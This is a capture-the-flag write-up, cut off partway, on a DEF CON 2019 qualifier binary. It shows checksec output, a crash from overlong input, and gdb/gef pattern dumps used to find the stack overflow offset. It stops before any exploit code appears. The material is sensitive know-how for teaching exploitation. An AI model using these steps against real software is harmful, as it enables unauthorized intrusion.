# Defcon 2019 Quals Speedrun 1

Full disclosure, I was not the one who solved this for my team (I was too slow). However I solved it after the competition, and this is how I did it (although I did this by hand, and some teams probably had auto-pwn tools to help them solve it quickly). 

First let's take a look at the binary:

```
$	pwn checksec speedrun-001 
[*] '/Hackery/defcon/speedrun/s1/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	file speedrun-001 
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
$	./speedrun-001 
Hello brave new challenger
Any last words?
15935728 
This will be the last thing that you say: 15935728

Alas, you had no luck today.
```

We can see that it is a `64` bit binary with NX, however no PIE or Stack Canary. In addition to that we can see that it is statically linked (so there are a lot of ROP gadgets, and since there is no PIE we know the addresses for all of them). We can also see that there is a buffer overflow.

```
$	python -c 'print "0"*0x1000' | ./speedrun-001 
Hello brave new challenger
Any last words?
This will be the last thing that you say: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Segmentation fault (core dumped)
```

So we have a buffer overflow. Let's figure out the offset from the start of our input. To do this I will use gdb to generate a string, send it, see what value is in the return address and see where in the string that value is.


```
gef➤  pattern create 4096
[+] Generating a pattern of 4096 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaau
[+] Saved as '$_gef0'
gef➤  r
Starting program: /Hackery/defcon/speedrun/s1/speedrun-001 
Hello brave new challenger
Any last words?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaau
This will be the last thing that you say: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaaj

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7fc             
$rbx   : 0x0000000000400400  →   sub rsp, 0x8
$rcx   : 0x0               
$rdx   : 0x00000000006bbd30  →  0x0000000000000000
$rsp   : 0x00007fffffffdef8  →  "eaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafka[...]"
$rbp   : 0x6661616161616164 ("daaaaaaf"?)
$rsi   : 0x0               
$rdi   : 0x1               
$rip   : 0x0000000000400bad  →   ret 
$r8    : 0x7fc             
$r9    : 0x7fc             
$r10   : 0xfffff82f        
$r11   : 0x246             
$r12   : 0x00000000004019a0  →   push rbp
$r13   : 0x0               
$r14   : 0x00000000006b9018  →  0x0000000000440ea0  →   mov rcx, rsi
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdef8│+0x0000: "eaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafka[...]"	 ← $rsp
0x00007fffffffdf00│+0x0008: "faaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaafla[...]"
0x00007fffffffdf08│+0x0010: "gaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafma[...]"
0x00007fffffffdf10│+0x0018: "haaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafna[...]"
0x00007fffffffdf18│+0x0020: "iaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoa[...]"
0x00007fffffffdf20│+0x0028: "jaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpa[...]"
0x00007fffffffdf28│+0x0030: "kaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqa[...]"
0x00007fffffffdf30│+0x0038: "laaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafra[...]"
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ba6                  call   0x40f710
     0x400bab                  nop    
     0x400bac                  leave  
 →   0x400bad                  ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-001", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400bad → ret 
────────────────────────────────────────────────────────────────────────────────
0x0000000000400bad in ?? ()
gef➤  zaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaa
Undefined command: "zaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaa